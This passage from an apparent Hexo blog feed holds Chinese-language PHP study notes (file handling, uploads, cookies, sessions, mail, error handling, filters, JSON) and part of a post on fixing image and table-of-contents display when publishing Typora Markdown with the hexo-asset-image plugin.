id="include-和-require-语句"><a href="#include-和-require-语句" class="headerlink" title="include 和 require 语句:"></a>include 和 require 语句:</h4><p>在执行流中插入写在其他文件中的有用的代码。</p><p><strong>include 和 require 除了处理错误的方式不同之外，在其他方面都是相同的：</strong></p><ul><li>require 生成一个致命错误，在错误发生后脚本会停止执行。</li><li>include 生成一个警告，在错误发生后脚本会继续执行。</li></ul><h2 id="PHP-文件处理"><a href="#PHP-文件处理" class="headerlink" title="PHP 文件处理"></a>PHP 文件处理</h2><h4 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h4><p>fopen()的第一个参数含有要打开的文件的名称，第二个参数规定了使用哪种模式来打开文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file&#x3D;fopen(&quot;blackpink.txt&quot;,&quot;r&quot;);</span><br></pre></td></tr></table></figure><p>关闭文件fclose() 函数，语法与打开相同。</p><h4 id="feof-函数"><a href="#feof-函数" class="headerlink" title="feof() 函数"></a>feof() 函数</h4><p>检测是否已到达文件末尾（EOF）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (feof($file)) echo &quot;文件结尾&quot;;</span><br></pre></td></tr></table></figure><ul><li><strong>fgets() 函数</strong>用于从文件中逐行读取文件。</li><li><strong>fgetc() 函数</strong>用于从文件中逐字符地读取文件。</li></ul><h2 id="PHP文件上传"><a href="#PHP文件上传" class="headerlink" title="PHP文件上传"></a>PHP文件上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">test</span><br><span class="line">|-----upload             # 文件上传的目录</span><br><span class="line">|-----form.html          # 表单文件</span><br><span class="line">|-----upload_file.php    # php 上传代码</span><br></pre></td></tr></table></figure><h4 id="创建一个文件上传表单"><a href="#创建一个文件上传表单" class="headerlink" title="创建一个文件上传表单"></a>创建一个文件上传表单</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;blackpink(blackpink.com)&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;form action&#x3D;&quot;upload_file.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;file&quot;&gt;文件名：&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file&quot; id&#x3D;&quot;file&quot;&gt;&lt;br&gt;</span><br><span class="line">    &lt;input type&#x3D;&quot;submit&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure><p> <strong>enctype</strong> 规定了在提交表单时要使用哪种内容类型,<strong>type=”file”</strong> 属性规定了应该把输入作为文件来处理</p><h4 id="创建上传脚本"><a href="#创建上传脚本" class="headerlink" title="创建上传脚本"></a>创建上传脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;上传文件名: &quot; . $_FILES[&quot;file&quot;][&quot;name&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件类型: &quot; . $_FILES[&quot;file&quot;][&quot;type&quot;] . &quot;&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件大小: &quot; . ($_FILES[&quot;file&quot;][&quot;size&quot;] &#x2F; 1024) . &quot; kB&lt;br&gt;&quot;;</span><br><span class="line">    echo &quot;文件临时存储的位置: &quot; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;];&#x2F;&#x2F;存储在服务器的文件的临时副本的名称</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>用户只能上传 .gif、.jpeg、.jpg、.png 文件，文件大小必须小于 200 kB。文件被上传结束后，默认被存储在了临时目录中，须将它从临时目录中删除或移动到其它地方，脚本执行完后临时目录里的文件肯定会被删除，所以在删除之前要用PHP的 copy() 函数将它复制到其它位置。</p><h2 id="PHP-Cookie"><a href="#PHP-Cookie" class="headerlink" title="PHP Cookie"></a>PHP Cookie</h2><p>常用于识别用户，通过setcookie() 函数（必须位于 <html> 标签之前。）设置 cookie。</html></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcookie(name, value, expire, path, domain);</span><br></pre></td></tr></table></figure><p>$_COOKIE 变量用于取回 cookie 的值，isset() 函数来确认是否已设置了 cookie。</p><p>删除 Cookie：使过期日期变更为过去的时间点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;&#x2F; 设置 cookie 过期时间为过去 0.5小时</span><br><span class="line">setcookie(&quot;user&quot;, &quot;&quot;, time()-1800);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="PHP-Session"><a href="#PHP-Session" class="headerlink" title="PHP Session"></a>PHP Session</h2><p>为每个访客创建一个唯一的 id (UID)，并基于这个 UID 来存储变量。UID 存储在 cookie 中，或者通过 URL 进行传导。但会话信息是临时的，在用户离开网站后将被删除，故若需要永久存储信息，可以把数据存储在数据库中。</p><p>启动会话：session_start() 函数必须位于 <html> 标签之前。</html></p><p>存储和取回 session 变量：使用 PHP $_SESSION 变量</p><p>删除某些 session 数据：使用 unset() 或 session_destroy() 函数。</p><h2 id="PHP-发送电子邮件"><a href="#PHP-发送电子邮件" class="headerlink" title="PHP 发送电子邮件"></a>PHP 发送电子邮件</h2><h4 id="PHP-mail-函数"><a href="#PHP-mail-函数" class="headerlink" title="PHP mail() 函数"></a>PHP mail() 函数</h4><p>从脚本中发送电子邮件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mail(to,subject,message,headers,parameters)</span><br></pre></td></tr></table></figure><p>实例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$to &#x3D; &quot;someone@example.com&quot;;         &#x2F;&#x2F; 邮件接收者</span><br><span class="line">$subject &#x3D; &quot;参数邮件&quot;;                &#x2F;&#x2F; 邮件标题</span><br><span class="line">$message &#x3D; &quot;Hello! 这是邮件的内容。&quot;;  &#x2F;&#x2F; 邮件正文</span><br><span class="line">$from &#x3D; &quot;someonelse@example.com&quot;;   &#x2F;&#x2F; 邮件发送者</span><br><span class="line">$headers &#x3D; &quot;From:&quot; . $from;         &#x2F;&#x2F; 头部信息设置</span><br><span class="line">mail($to,$subject,$message,$headers);</span><br><span class="line">echo &quot;邮件已发送&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="PHP-E-mail-注入"><a href="#PHP-E-mail-注入" class="headerlink" title="PHP E-mail 注入"></a>PHP E-mail 注入</h4><p>常规php e-mail 存在的问题：未经授权的用户可通过输入表单在邮件头部插入数据。为防止 e-mail 注入应对输入进行验证。可使用 PHP 过滤器来对输入进行验证：</p><ul><li>FILTER_SANITIZE_EMAIL 过滤器从字符串中删除电子邮件的非法字符</li><li>FILTER_VALIDATE_EMAIL 过滤器验证电子邮件地址的值</li></ul><h2 id="PHP-错误处理"><a href="#PHP-错误处理" class="headerlink" title="PHP 错误处理"></a>PHP 错误处理</h2><h4 id="使用-die-函数"><a href="#使用-die-函数" class="headerlink" title="使用 die() 函数"></a>使用 die() 函数</h4><h4 id="创建自定义错误处理器"><a href="#创建自定义错误处理器" class="headerlink" title="创建自定义错误处理器"></a>创建自定义错误处理器</h4><p>创建了一个专用函数，可以在 PHP 中发生错误时调用该函数。该函数必须有能力处理至少两个参数 (error level 和 error message)，最多可以接受五个参数（可选的：file, line-number 和 error context）</p><h4 id="设置错误处理程序"><a href="#设置错误处理程序" class="headerlink" title="设置错误处理程序"></a>设置错误处理程序</h4><p>若自定义函数要处理所有错误，set_error_handler() 仅需要一个参数</p><h4 id="触发错误：-trigger-error"><a href="#触发错误：-trigger-error" class="headerlink" title="触发错误： trigger_error()"></a>触发错误： trigger_error()</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$test&#x3D;2;</span><br><span class="line">if ($test&gt;1)</span><br><span class="line">&#123;</span><br><span class="line">    trigger_error(&quot;变量值必须小于等于 1&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>可以在脚本中任何位置触发错误，通过添加的第二个参数，规定所触发的错误类型。</p><ul><li>E_USER_ERROR - 错误无法恢复。脚本执行被中断。</li><li>E_USER_WARNING - 脚本执行不被中断。</li><li>E_USER_NOTICE -在脚本发现可能有错误时发生，但也可能在脚本正常运行时发生。</li></ul><h4 id="错误记录"><a href="#错误记录" class="headerlink" title="错误记录"></a>错误记录</h4><p>根据在 php.ini 中的 error_log 配置，PHP 向服务器的记录系统或文件发送错误记录，通过 error_log() 函数，向指定的文件或远程目的地发送错误记录；可通过电子邮件发送错误消息。</p><h2 id="PHP-异常处理"><a href="#PHP-异常处理" class="headerlink" title="PHP 异常处理"></a>PHP 异常处理</h2><h4 id="Try、throw-和-catch"><a href="#Try、throw-和-catch" class="headerlink" title="Try、throw 和 catch"></a>Try、throw 和 catch</h4><ol><li>Try - 使用异常的函数应该位于 “try” 代码块内。如果无触发异常，则代码将照常继续执行。如果异常被触发，会抛出一个异常。</li><li>Throw - 里规定如何触发异常。每一个 “throw” 必须对应至少一个 “catch”。</li><li>Catch - “catch” 代码块会捕获异常，并创建一个包含异常信息的对象。</li></ol><h4 id="创建一个自定义的-Exception-类（继承了-PHP-的-exception-类的所有属性，可向其添加自定义的函数）"><a href="#创建一个自定义的-Exception-类（继承了-PHP-的-exception-类的所有属性，可向其添加自定义的函数）" class="headerlink" title="创建一个自定义的 Exception 类（继承了 PHP 的 exception 类的所有属性，可向其添加自定义的函数）"></a>创建一个自定义的 Exception 类（继承了 PHP 的 exception 类的所有属性，可向其添加自定义的函数）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class customException extends Exception</span><br><span class="line">&#123;</span><br><span class="line">    public function errorMessage()</span><br><span class="line">    &#123;</span><br><span class="line">        $errorMsg &#x3D; &#39;错误行号 &#39;.$this-&gt;getLine().&#39; in &#39;.$this-&gt;getFile()</span><br><span class="line">        .&#39;: &lt;b&gt;&#39;.$this-&gt;getMessage().&#39;&lt;&#x2F;b&gt; 不是一个合法的 E-Mail 地址&#39;;</span><br><span class="line">        return $errorMsg;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$email &#x3D; &quot;someone@example...com&quot;;</span><br><span class="line"> </span><br><span class="line">try</span><br><span class="line">&#123;</span><br><span class="line">    if(filter_var($email, FILTER_VALIDATE_EMAIL) &#x3D;&#x3D;&#x3D; FALSE)</span><br><span class="line">    &#123;</span><br><span class="line">        &#x2F;&#x2F; 如果是个不合法的邮箱地址，抛出异常</span><br><span class="line">        throw new customException($email);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">catch (customException $e)&#x2F;&#x2F;catch&quot; 代码块捕获异常，并显示错误消息。</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;display custom message</span><br><span class="line">echo $e-&gt;errorMessage();&#x2F;&#x2F;如果 e-mail 地址不合法，则该函数返回一条错误消息</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>设置顶层异常处理器：set_exception_handler() 函数可设置处理所有未捕获异常的用户定义函数。</p><h2 id="PHP-过滤器"><a href="#PHP-过滤器" class="headerlink" title="PHP 过滤器"></a>PHP 过滤器</h2><p>用于验证和过滤来自非安全来源的数据。</p><ul><li>filter_var() - 通过一个指定的过滤器来过滤单一的变量</li><li>filter_var_array() - 通过相同的或不同的过滤器来过滤多个变量</li><li>filter_input - 获取一个输入变量，并对它进行过滤</li><li>filter_input_array - 获取多个输入变量，并通过相同的或不同的过滤器对它们进行过滤</li></ul><p>Validating 过滤器：用于验证用户输入，严格的格式规则（比如 URL 或 E-Mail 验证），如果成功则返回预期的类型，如果失败则返回 FALSE。</p><p>Sanitizing 过滤器：用于允许或禁止字符串中指定的字符，无数据格式规则，始终返回字符串。</p><p>选项和标志用于向指定的过滤器添加额外的过滤选项，不同的过滤器有不同的选项和标志。</p><h4 id="验证输入"><a href="#验证输入" class="headerlink" title="验证输入"></a>验证输入</h4><p>先确认是否存在我们正在查找的输入数据，然后用 filter_input() 函数过滤输入的数据；检测是否存在 输入变量，如果存在输入变量，检测它是否是有效的地址。</p><p>净化输入：filter_input()</p><h4 id="过滤多个输入：filter-var-array-或-the-filter-input-array"><a href="#过滤多个输入：filter-var-array-或-the-filter-input-array" class="headerlink" title="过滤多个输入：filter_var_array 或 the filter_input_array"></a>过滤多个输入：filter_var_array 或 the filter_input_array</h4><p>filter_input_array() 函数的第二个参数可以是数组或单一过滤器的 ID。</p><p>如果该参数是单一过滤器的 ID，那这个指定的过滤器会过滤输入数组中所有的值。</p><p>如果该参数是一个数组，那么此数组必须遵循下面的规则：</p><ul><li>必须是一个关联数组，其中包含的输入变量是数组的键</li><li>此数组的值必须是过滤器的 ID ，或者是规定了过滤器、标志和选项的数组</li></ul><h4 id="Filter-Callback"><a href="#Filter-Callback" class="headerlink" title="Filter Callback"></a>Filter Callback</h4><p>调用自定义的函数，将准备用到的过滤器的函数，按指定选项的规定方法进行规定；在关联数组中，带有名称 “options”。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function convertSpace($string)</span><br><span class="line">&#123;</span><br><span class="line">    return str_replace(&quot;_&quot;, &quot;.&quot;, $string);&#x2F;&#x2F;创建一个把 &quot;_&quot; 替换为 &quot;.&quot; 的函数</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">$string &#x3D; &quot;black_pink!&quot;;</span><br><span class="line"> </span><br><span class="line">echo filter_var($string, FILTER_CALLBACK,</span><br><span class="line">array(&quot;options&quot;&#x3D;&gt;&quot;convertSpace&quot;));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：black.pink!</p><h2 id="PHP-JSON"><a href="#PHP-JSON" class="headerlink" title="PHP JSON"></a>PHP JSON</h2><h4 id="json-encode：用于对变量进行-JSON-编码"><a href="#json-encode：用于对变量进行-JSON-编码" class="headerlink" title="json_encode：用于对变量进行 JSON 编码"></a>json_encode：用于对变量进行 JSON 编码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string json_encode ( $value [, $options &#x3D; 0 ] )</span><br></pre></td></tr></table></figure><p>实例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $arr &#x3D; array(&#39;a&#39; &#x3D;&gt; 1, &#39;b&#39; &#x3D;&gt; 2, &#39;c&#39; &#x3D;&gt; 3, &#39;d&#39; &#x3D;&gt; 4, &#39;e&#39; &#x3D;&gt; 5);</span><br><span class="line">   echo json_encode($arr);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：{“a”:1,”b”:2,”c”:3,”d”:4,”e”:5}</p><h4 id="将-PHP-对象转换为-JSON-格式数据"><a href="#将-PHP-对象转换为-JSON-格式数据" class="headerlink" title="将 PHP 对象转换为 JSON 格式数据"></a>将 PHP 对象转换为 JSON 格式数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   class Emp &#123;</span><br><span class="line">       public $name &#x3D; &quot;&quot;;</span><br><span class="line">       public $hobbies  &#x3D; &quot;&quot;;</span><br><span class="line">       public $birthdate &#x3D; &quot;&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">   $e &#x3D; new Emp();</span><br><span class="line">   $e-&gt;name &#x3D; &quot;yuting&quot;;</span><br><span class="line">   $e-&gt;hobbies  &#x3D; &quot;travel&quot;;</span><br><span class="line">   $e-&gt;birthdate &#x3D; date(&#39;m&#x2F;d&#x2F;Y h:i:s a&#39;, &quot;9&#x2F;16&#x2F;2002 8:30:03 a&quot;);</span><br><span class="line">   $e-&gt;birthdate &#x3D; date(&#39;m&#x2F;d&#x2F;Y h:i:s a&#39;, strtotime(&quot;9&#x2F;16&#x2F;2002 8:30:03&quot;));</span><br><span class="line"></span><br><span class="line">   echo json_encode($e);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>输出：{“name”:”yuting”,”hobbies”:”travel”,”birthdate”:”09/16/2002 8:30:03 am”}</p><h4 id="json-decode"><a href="#json-decode" class="headerlink" title="json_decode"></a>json_decode</h4><p>用于对 JSON 格式的字符串进行解码，并转换为 PHP 变量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed json_decode ($json_string [,$assoc &#x3D; false [, $depth &#x3D; 512 [, $options &#x3D; 0 ]]])</span><br></pre></td></tr></table></figure><ul><li><strong>json_string</strong>: 待解码的 JSON 字符串，必须是 UTF-8 编码数据</li><li><strong>assoc</strong>: 当该参数为 TRUE 时，将返回数组，FALSE 时返回对象。</li><li><strong>depth</strong>: 整数类型的参数，它指定递归深度</li><li><strong>options</strong>: 二进制掩码，目前只支持 JSON_BIGINT_AS_STRING 。</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Markdown上传博客文章的图片显示及目录生成问题</title>
    <link href="/2020/10/27/problem/"/>
    <url>/2020/10/27/problem/</url>
    
    <content type="html"><![CDATA[<ul><li><a href="#%E5%9B%BE%E7%89%87">图片</a><ul><li><a href="#%E6%B3%95%E4%B8%80">法一：</a><ul><li><a href="#%E4%B8%80%E8%A3%85%E6%8F%92%E4%BB%B6">一、装插件</a></li><li><a href="#%E4%BA%8C%E6%94%B9%E8%AE%BE%E7%BD%AE">二、改设置</a><ul><li><a href="#1typora%E7%9A%84%E5%9B%BE%E7%89%87%E6%A0%B9%E7%9B%AE%E5%BD%95%E8%AE%BE%E7%BD%AE">1、Typora的图片根目录设置</a></li><li><a href="#2typora%E8%AE%BE%E7%BD%AE%E5%9B%BE%E7%89%87%E7%9A%84%E7%9B%B8%E5%AF%B9%E8%B7%AF%E5%BE%84">2、Typora设置图片的相对路径</a></li><li><a href="#3typora%E8%87%AA%E5%8A%A8%E5%A4%8D%E5%88%B6%E5%9B%BE%E7%89%87%E5%88%B0%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%8B">3、Typora自动复制图片到指定目录下</a></li></ul></li></ul></li><li><a href="#%E6%B3%95%E4%BA%8C%E9%80%82%E7%94%A8%E4%BA%8Emac">法二：(适用于mac)</a></li></ul></li><li><a href="#%E7%9B%AE%E5%BD%95">目录</a></li><li><a href="#%E5%B0%BE%E8%AE%B0">尾记</a></li></ul><p>刚发表第一篇博客文章时，发现在typora里写的带有图片及目录的文章更到博客里图片与目录就无法显示；为此找了许多方法，总结如下：</p><p>原因:由于上传的图片使用的是绝对路径或者相对路径，每次插入截图的图片时，默认都是将图片存在C盘中，当MD文件移动时，图片的链接就会失效，就会出现图片加载失败的问题。</p><h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><h3 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h3><h4 id="一、装插件"><a href="#一、装插件" class="headerlink" title="一、装插件"></a>一、装插件</h4><p>我们需要安装一个图片路径转换的插件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install https:&#x2F;&#x2F;github.com&#x2F;CodeFalling&#x2F;hexo-asset-image --save</span><br></pre></td></tr></table></figure><p>插件的内容需要修改:</p><p>打开/node_modules/hexo-asset-image/index.js，将内容更换为下面的代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&#39;use strict&#39;;</span><br><span class="line">var cheerio &#x3D; require(&#39;cheerio&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;14480345&#x2F;how-to-get-the-nth-occurrence-in-a-string</span><br><span class="line">function getPosition(str, m, i) &#123;</span><br><span class="line">  return str.split(m, i).join(m).length;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var version &#x3D; String(hexo.version).split(&#39;.&#39;);</span><br><span class="line">hexo.extend.filter.register(&#39;after_post_render&#39;, function(data)&#123;</span><br><span class="line">  var config &#x3D; hexo.config;</span><br><span class="line">  if(config.post_asset_folder)&#123;</span><br><span class="line">    var link &#x3D; data.permalink;</span><br><span class="line">if(version.length &gt; 0 &amp;&amp; Number(version[0]) &#x3D;&#x3D; 3)</span><br><span class="line">   var beginPos &#x3D; getPosition(link, &#39;&#x2F;&#39;, 1) + 1;</span><br><span class="line">else</span><br><span class="line">   var beginPos &#x3D; getPosition(link, &#39;&#x2F;&#39;, 3) + 1;</span><br><span class="line">&#x2F;&#x2F; In hexo 3.1.1, the permalink of &quot;about&quot; page is like &quot;...&#x2F;about&#x2F;index.html&quot;.</span><br><span class="line">var endPos &#x3D; link.lastIndexOf(&#39;&#x2F;&#39;) + 1;</span><br><span class="line">    link &#x3D; link.substring(beginPos, endPos);</span><br><span class="line"></span><br><span class="line">    var toprocess &#x3D; [&#39;excerpt&#39;, &#39;more&#39;, &#39;content&#39;];</span><br><span class="line">    for(var i &#x3D; 0; i &lt; toprocess.length; i++)&#123;</span><br><span class="line">      var key &#x3D; toprocess[i];</span><br><span class="line"> </span><br><span class="line">      var $ &#x3D; cheerio.load(data[key], &#123;</span><br><span class="line">        ignoreWhitespace: false,</span><br><span class="line">        xmlMode: false,</span><br><span class="line">        lowerCaseTags: false,</span><br><span class="line">        decodeEntities: false</span><br><span class="line">      &#125;);</span><br><span class="line"></span><br><span class="line">      $(&#39;img&#39;).each(function()&#123;</span><br><span class="line">if ($(this).attr(&#39;src&#39;))&#123;</span><br><span class="line">&#x2F;&#x2F; For windows style path, we replace &#39;\&#39; to &#39;&#x2F;&#39;.</span><br><span class="line">var src &#x3D; $(this).attr(&#39;src&#39;).replace(&#39;\\&#39;, &#39;&#x2F;&#39;);</span><br><span class="line">if(!&#x2F;http[s]*.*|\&#x2F;\&#x2F;.*&#x2F;.test(src) &amp;&amp;</span><br><span class="line">   !&#x2F;^\s*\&#x2F;&#x2F;.test(src)) &#123;</span><br><span class="line">  &#x2F;&#x2F; For &quot;about&quot; page, the first part of &quot;src&quot; can&#39;t be removed.</span><br><span class="line">  &#x2F;&#x2F; In addition, to support multi-level local directory.</span><br><span class="line">  var linkArray &#x3D; link.split(&#39;&#x2F;&#39;).filter(function(elem)&#123;</span><br><span class="line">return elem !&#x3D; &#39;&#39;;</span><br><span class="line">  &#125;);</span><br><span class="line">  var srcArray &#x3D; src.split(&#39;&#x2F;&#39;).filter(function(elem)&#123;</span><br><span class="line">return elem !&#x3D; &#39;&#39; &amp;&amp; elem !&#x3D; &#39;.&#39;;</span><br><span class="line">  &#125;);</span><br><span class="line">  if(srcArray.length &gt; 1)</span><br><span class="line">srcArray.shift();</span><br><span class="line">  src &#x3D; srcArray.join(&#39;&#x2F;&#39;);</span><br><span class="line">  $(this).attr(&#39;src&#39;, config.root + link + src);</span><br><span class="line">  console.info&amp;&amp;console.info(&quot;update link as:--&gt;&quot;+config.root + link + src);</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">console.info&amp;&amp;console.info(&quot;no src attr, skipped...&quot;);</span><br><span class="line">console.info&amp;&amp;console.info($(this));</span><br><span class="line">&#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      data[key] &#x3D; $.html();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>操作完成后，每次用hexo  new XXX 创建新文章时列表会多出一个与文章同名的文件夹：</p><p><img src="/2020/10/27/problem/1.jpg" alt="1"></p><p>接下来打开_config.yml文件，修改下述内容，将false改成true。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure><p>将文章需要用到的图片存入同名文件夹中，但仅仅这样还是无法显示图片。</p><h4 id="二、改设置"><a href="#二、改设置" class="headerlink" title="二、改设置"></a>二、改设置</h4><h5 id="1、Typora的图片根目录设置"><a href="#1、Typora的图片根目录设置" class="headerlink" title="1、Typora的图片根目录设置"></a>1、Typora的图片根目录设置</h5><p>点击 文件—偏好设置—图像</p><p>默认是“无特殊操作”,更改为“复制图片到./${filename}.assets文件夹”</p><h5 id="2、Typora设置图片的相对路径"><a href="#2、Typora设置图片的相对路径" class="headerlink" 